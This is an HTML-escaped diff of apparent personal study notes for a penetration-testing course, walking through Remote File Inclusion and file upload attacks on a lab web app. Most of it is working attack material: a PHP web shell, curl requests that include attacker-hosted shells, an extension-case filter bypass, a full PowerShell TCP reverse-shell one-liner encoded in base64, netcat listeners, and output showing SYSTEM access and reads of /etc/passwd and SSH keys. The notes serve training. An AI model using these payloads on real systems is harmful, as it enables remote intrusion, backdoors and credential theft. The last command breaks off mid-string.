+&lt;li&gt;Kali includes many &lt;code&gt;/usr/share/webshells/php/&lt;/code&gt; that can be used for RFI.&lt;ul&gt;
+&lt;li&gt;We will use &lt;code&gt;simple-backdoor.php&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Similar to snippet in last section, it accepts &lt;code&gt;cmd&lt;/code&gt; param.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+...
+&amp;lt;?php
+if(isset($_REQUEST[&amp;#39;cmd&amp;#39;])){
+        echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;;
+        $cmd = ($_REQUEST[&amp;#39;cmd&amp;#39;]);
+        system($cmd);
+        echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;;
+        die;
+}
+?&amp;gt;
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To leverage an RFI vulnerability, we need to make the remote file accessible by the target system.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We could also use a publicly-accessible file, such as one from Github.&lt;/p&gt;
+&lt;p&gt;Next, we&amp;#39;ll use curl to include the hosted file via HTTP and specify ls as our command.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:/usr/share/webshells/php/$ curl &amp;quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&amp;amp;cmd=ls&amp;quot;
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt; 
+
+&amp;lt;pre&amp;gt;admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+&amp;lt;/pre&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Remote File Inclusion (RFI) Exercises&lt;/h4&gt;
+&lt;p&gt;Follow the steps from this section to leverage RFI to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the &amp;quot;cmd&amp;quot; parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+└─$ curl &amp;quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&amp;amp;cmd=ls&amp;quot;
+
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;
+
+&amp;lt;pre&amp;gt;admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+&amp;lt;/pre&amp;gt; 
+...
+
+┌──(kali㉿kali)-[~]
+└─$ curl &amp;quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&amp;amp;cmd=cat%20..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;quot;
+
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;
+
+&amp;lt;pre&amp;gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+elaine:x:1000:1000::/home/elaine:/bin/bash
+&amp;lt;/pre&amp;gt; 
+...
+
+┌──(kali㉿kali)-[~]
+└─$ urlencode &amp;quot;cat ../../../../../../../home/elaine/.ssh/authorized_keys&amp;quot;
+cat%20..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Felaine%2F.ssh%2Fauthorized_keys
+
+┌──(kali㉿kali)-[~]
+└─$ curl &amp;quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&amp;amp;cmd=cat%20..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Felaine%2F.ssh%2Fauthorized_keys&amp;quot;
+
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;
+
+&amp;lt;pre&amp;gt;command = &amp;quot;OS{558785e93a9fdcfa551752465ff36356}&amp;quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOMAXqYDrvKuG0L+G20mS7ARlXSBnLd8sxCXCB2V/CHDftnyxwQMqkc7B14GncT4dUzd1iRmrxczF6ED45Yl8lhRXwJxDOtXLYInwA/9KVgFU5ncDdooIgWe//5HW0yZDBCsKiw2IpoxfGskRMeUufiPW7x+pG/RL6wbf3YLila1cT1o/XTuESVX8DFWQEa5Lq21F7LDmoEGfUQFqf33bWA5Cy4KrUfWmiSZrlC0y2nk6qJVIDJHAmhReM2DRYjNyxKb/B5kNE7yj94kh9EmYWffAN/rlFk1JWk7gCjClp/fdpsTIANFFsyfZ0ADMpknYURWY4Urjlm7XZ+OTjx+Sn4gnQq8+/wPi4ypqKL403OMecFGhnsvI20Pefq+c44K+R52igJAEQA7z3Jv74lPUO5F9PVXyOg6N46e2j/3UCyfYKaJncfB0Zc55BU1nQKFS2SjjTvTAD7Lhg0F1q0HKbM4z12ph8OzzzMvLoOYwujt/etKXm9qMLOwMcgfA+R0k= elaine@tri-island
+&amp;lt;/pre&amp;gt;  
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Instead of including the /usr/share/webshells/php/simple-backdoor.php webshell, include the PHP reverse shell from Pentestmonkey&amp;#39;s Github repository. Change the $ip variable to the IP of your Kali machine and $port to 4444. Start a Netcat listener on port 4444 on your Kali machine and exploit the RFI vulnerability on VM #2 to include the PHP reverse shell. Find the flag in the /home/guybrush/.treasure/flag.txt file.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+### Netcat listener
+
+$ nc -nvlp 444
+
+
+### RFI Rev shell
+
+┌──(kali㉿kali)-[~]
+└─$ curl &amp;quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/pt-monkey-php-rev-shell.php&amp;quot;
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.198] from (UNKNOWN) [192.168.246.16] 44510
+Linux 66576cb217b8 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 GNU/Linux
+ 19:30:18 up 3 min,  0 users,  load average: 0.23, 0.18, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
+/bin/sh: 0: can&amp;#39;t access tty; job control turned off
+$ sudo -l
+Matching Defaults entries for www-data on 66576cb217b8:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 66576cb217b8:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+$ sudo cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+guybrush:x:1000:1000::/home/guybrush:/bin/bash
+$ sudo cat /home/guybrush/.treasure/flag.txt
+OS{60430fabfa02aa752791194b9591be5e}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;9.2 File Upload Vulnerabilities&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;
+    Understand File Upload vulnerabilities 
+
+    ```
+    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Learn how to identify File Upload vulnerabilities 
+
+```
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;pre&gt;&lt;code&gt;  Explore different vectors to exploit File Upload vulnerabilities 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Using Executable Files&lt;/h6&gt;
+&lt;ul&gt;
+&lt;li&gt;Upload files to be run by the web server.&lt;/li&gt;
+&lt;li&gt;To identify;&lt;ul&gt;
+&lt;li&gt;Depending on application and usage.&lt;ul&gt;
+&lt;li&gt;Make educated guesses to locate upload mechanisms.&lt;/li&gt;
+&lt;li&gt;If app is a CMS, we can often upload an avatar.&lt;/li&gt;
+&lt;li&gt;If company website, upload mechanism in career section for resume.&lt;/li&gt;
+&lt;li&gt;If lawyer office, upload for case files.&lt;/li&gt;
+&lt;li&gt;Etc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The mechanism may not be obvious, so carefully enumerate.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;quot;Mountain Desserts&amp;quot; app, the Admin link has been replaced by an upload form. The text explains that we can upload a picture to win a contest. The tab bar also shows an XAMPP icon displayed in the current tab, indicating the web application is likely running the XAMPP stack. The text explains that the company wanted to switch to Windows, so we can assume that the web application is now running on a Windows system. Let&amp;#39;s find out if we can upload a text file instead of an image.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ echo &amp;quot;this is a test&amp;quot; &amp;gt; test.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Success.&lt;/p&gt;
+&lt;p&gt;Attempt to upload the simple-backdoor.php webshell used in the previous Learning Unit. Fails due to filter. Utilize trial and error approach.&lt;/p&gt;
+&lt;p&gt;One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. This may allow us to bypass simple filters that only check for the most common file extensions, .php and .phtml. These alternative file extensions were mostly used for older versions of PHP or specific use cases, but are still supported for compatibility in modern PHP versions.&lt;/p&gt;
+&lt;p&gt;Another way we can bypass the filter is by changing characters in the file extension to upper case. The blacklist may be implemented by comparing the file extension of the uploaded file to a list of strings containing only lower-case PHP file extensions. If so, we can update the uploaded file extension with upper-case characters to bypass the filter.&lt;/p&gt;
+&lt;p&gt;Let&amp;#39;s try the second method, updating our simple-backdoor.php file extension from .php to .pHP. After renaming the file either in the terminal or file explorer, we&amp;#39;ll upload it via the web form.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+...
+ Directory of C:\xampp\htdocs\meteor\uploads
+
+04/04/2022  06:23 AM    &amp;lt;DIR&amp;gt;          .
+04/04/2022  06:23 AM    &amp;lt;DIR&amp;gt;          ..
+04/04/2022  06:21 AM               328 simple-backdoor.pHP
+04/04/2022  06:03 AM                15 test.txt
+               2 File(s)            343 bytes
+               2 Dir(s)  15,410,925,568 bytes free
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PowerShell one-liner for rev shell, use PowerShell on our Kali machine to encode the reverse shell one-liner. First, let&amp;#39;s create the variable $Text, which will be used for storing the reverse shell one-liner as a string. Then, we can use the method convert6 and the property Unicode from the class Encoding to encode the contents of the $Text variable.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ pwsh
+PowerShell 7.1.3
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type &amp;#39;help&amp;#39; to get help.
+
+PS&amp;gt; $Text = &amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.119.3&amp;quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;
+
+
+PS&amp;gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+PS&amp;gt; $EncodedText =[Convert]::ToBase64String($Bytes)
+
+PS&amp;gt; $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+
+PS&amp;gt; exit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As shown in Listing 32, the $EncodedText variable contains the encoded reverse shell one-liner. Let&amp;#39;s use curl to execute the encoded one-liner via the uploaded simple-backdoor.pHP. We can add the base64 encoded string for the powershell command using the -enc parameter. We&amp;#39;ll also need to use URL encoding for the spaces.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After executing the command, we should receive an incoming reverse shell in the second terminal where Netcat is listening.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.50.189
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.50.254
+
+PS C:\xampp\htdocs\meteor\uploads&amp;gt; whoami
+nt authority\system
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Below shows us the frameworks and languages for which Kali already offers web shells. It is important to understand that while the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. After we identify the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system.&lt;/p&gt;
+&lt;p&gt;We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ ls -la /usr/share/webshells
+total 40
+drwxr-xr-x   8 root root  4096 Feb 11 02:00 .
+drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
+drwxr-xr-x   2 root root  4096 Feb 11 01:58 asp
+drwxr-xr-x   2 root root  4096 Apr 25 07:25 aspx
+drwxr-xr-x   2 root root  4096 Feb 11 01:58 cfm
+drwxr-xr-x   2 root root  4096 Apr 25 07:06 jsp
+lrwxrwxrwx   1 root root    19 Feb 11 02:00 laudanum -&amp;gt; /usr/share/laudanum
+drwxr-xr-x   2 root root  4096 Feb 11 01:58 perl
+drwxr-xr-x   3 root root  4096 Feb 11 01:58 php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;File Upload Vulnerabilities Exercises&lt;/h6&gt;
+&lt;p&gt;Follow the steps above on VM #1 and exploit the file upload vulnerability. The flag is located in the C:\xampp\passwords.txt file as a password for the mountainadmin user.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~/webshells/ps]
+└─$ cat ps-one-liner.md 
+# PowerShell Encoded One-Liner Setup
+
+kali@kali:~$ pwsh
+PowerShell 7.1.3
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type &amp;#39;help&amp;#39; to get help.
+
+PS&amp;gt; $Text = &amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.119.3&amp;quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;
+
+
+PS&amp;gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+PS&amp;gt; $EncodedText =[Convert]::ToBase64String($Bytes)
+
+PS&amp;gt; $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+
+PS&amp;gt; exit
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/webshells/ps]
+└─$ cp /usr/share/webshells/php/simple-backdoor.php simple-backdoor.php
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/webshells/ps]
+└─$ ls
+ps-one-liner.md  simple-backdoor.php
+
+# php file was filtered
+
+┌──(kali㉿kali)-[~/webshells/ps]
+└─$ mv simple-backdoor.php simple-backdoor.pHP
+
+# changing case of extension succeeded on upload, enumerated upload dir &amp;#39;http://mountaindesserts.com/meteor/uploads/&amp;#39;
+
+# Now prepare the PS one-liner
+
+┌──(kali㉿kali)-[~]
+└─$ pwsh  
+PowerShell 7.2.6
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type &amp;#39;help&amp;#39; to get help.
+
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS&amp;gt; $Text = &amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.45.198&amp;quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS&amp;gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS&amp;gt; $EncodedText =[Convert]::ToBase64String($Bytes)
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS&amp;gt; $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+
+# NOTE THAT we hit the uploads and php back-door directly, using a ? for the cmd param
+
+┌──(kali㉿kali)-[~]
+└─$ curl &amp;quot;http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=dir&amp;quot;
+&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;
+
+&amp;lt;pre&amp;gt; Volume in drive C has no label.
+ Volume Serial Number is E6C8-741F
+
+ Directory of C:\xampp\htdocs\meteor\uploads
+
+08/27/2023  12:52 PM    &amp;lt;DIR&amp;gt;          .
+05/03/2022  07:02 AM    &amp;lt;DIR&amp;gt;          ..
+05/03/2022  06:21 AM                 0 $sock)
+08/27/2023  12:52 PM               328 simple-backdoor.pHP
+               2 File(s)            328 bytes
+               2 Dir(s)   6,911,909,888 bytes free
+&amp;lt;/pre&amp;gt;                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ curl &amp;quot;http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZ